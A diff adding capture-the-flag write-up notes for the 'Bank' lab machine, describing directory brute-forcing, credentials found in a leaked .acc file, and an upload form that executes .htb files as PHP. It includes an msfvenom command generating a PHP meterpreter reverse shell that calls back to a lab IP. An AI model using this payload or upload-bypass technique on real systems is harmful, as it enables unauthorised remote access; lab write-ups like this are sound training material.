@@ -25,7 +25,9 @@ Nmap done: 1 IP address (1 host up) scanned in 38.35 seconds
 
 ```
 - The hostname must be guessed on this machine (bank.htb) add to hosts file
-- feroxbuster
-```
-
-```
+- feroxbuster with the lowercase medium wordlist, will find the balance-transfer 
+- found some .acc file one of them seems small in size
+- 68576f20e9732f1b2edc4df5b8533230.acc we open it using vscode and found some creds
+- we also have alogin page we try the creds and we got in there are 2 pages we review the source code of each of them on the support page we found in the source code a line that says any .htb will be executed as .php
+- Generate a reverse PHP shell with msfvenom -p php/meterpreter/reverse_tcp lhost=<LAB IP> lport=<PORT> -f raw > writeup.htb and upload it
+using the form found in the support page 
